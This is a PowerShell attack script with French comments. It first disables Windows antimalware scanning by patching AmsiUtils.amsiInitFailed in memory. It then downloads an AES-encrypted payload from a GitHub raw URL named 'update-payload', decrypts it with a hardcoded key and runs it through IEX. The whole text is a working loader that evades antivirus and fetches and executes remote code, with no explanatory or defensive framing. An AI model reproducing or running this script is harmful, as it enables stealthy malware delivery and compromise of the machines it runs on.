# AMSI bypass - patch AmsiUtils.amsiInitFailed en mémoire
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Télécharge et déchiffre payload.enc
$url = "https://raw.githubusercontent.com/raacineagency/update-payload/refs/heads/main/payload.enc"
$dst = "$env:TEMP\p.enc"
(New-Object Net.WebClient).DownloadFile($url, $dst)
$b64 = [System.IO.File]::ReadAllText($dst) -replace '\s',''
$enc = [Convert]::FromBase64String($b64)
$key = [Text.Encoding]::ASCII.GetBytes("0123456789abcdef0123456789abcdef")
$iv  = [Text.Encoding]::ASCII.GetBytes("0123456789abcdef")
$aes = [Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = 'CBC'
$aes.Padding = 'PKCS7'
$bytes = $aes.CreateDecryptor().TransformFinalBlock($enc, 0, $enc.Length)
$script = [Text.Encoding]::UTF8.GetString($bytes)
IEX $script
